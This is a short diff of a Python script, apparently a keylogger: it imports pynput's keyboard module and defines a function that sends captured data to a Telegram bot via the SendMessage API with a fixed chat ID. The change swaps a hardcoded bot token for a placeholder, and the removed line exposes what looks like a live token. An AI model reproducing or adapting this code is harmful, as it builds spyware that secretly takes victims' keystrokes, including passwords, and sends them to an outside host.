@@ -11,7 +11,7 @@ from pynput import keyboard
 num=[]  #جاوگیری از هنگ نشدن برنامه و پردازش بهتر
 
 def send(data):
-    url = ("https://api.telegram.org/bot6921623880:AAGFYhQZjMp28nGPv1uZbhbF2V8CzsbffTg/SendMessage?chat_id=574674645&text= " + str(data)) 
+    url = ("https://api.telegram.org/API_Telegram/SendMessage?chat_id=574674645&text= " + str(data)) 
     payload = {"UrlBox":url,
             "AgentList":"Mozilla Firefox",
             "VersionsList":"HTTP/1.1",
